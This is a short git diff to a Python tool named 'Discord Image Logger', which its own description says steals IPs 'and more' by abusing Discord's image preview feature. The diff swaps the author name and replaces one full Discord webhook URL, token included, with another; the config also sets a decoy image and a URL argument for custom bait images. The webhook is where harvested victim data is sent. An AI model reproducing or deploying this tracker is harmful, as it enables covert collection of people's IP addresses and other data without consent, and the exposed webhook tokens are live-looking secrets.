@@ -8,11 +8,11 @@ import traceback, requests, base64, httpagentparser
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
-__author__ = "ACE"
+__author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1381255625367097397/gdjJQR_RX-Ksp_KMsHOq-n-R_W8xn0qx1crS78_xVFkROuncRDkgf-nNBGEdq61wJbGI",
+    "webhook": "https://discord.com/api/webhooks/1347691418423918612/TY4jhuDOUeauxK-VGtvdqf0jcfI3xhAKkthZ2hoNQz3cHFxIu-12AEcSY7_e3WkU643q",
     "image": "https://static1.howtogeekimages.com/wordpress/wp-content/uploads/2023/04/1-fix-operation-did-not-complete-error-featured.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
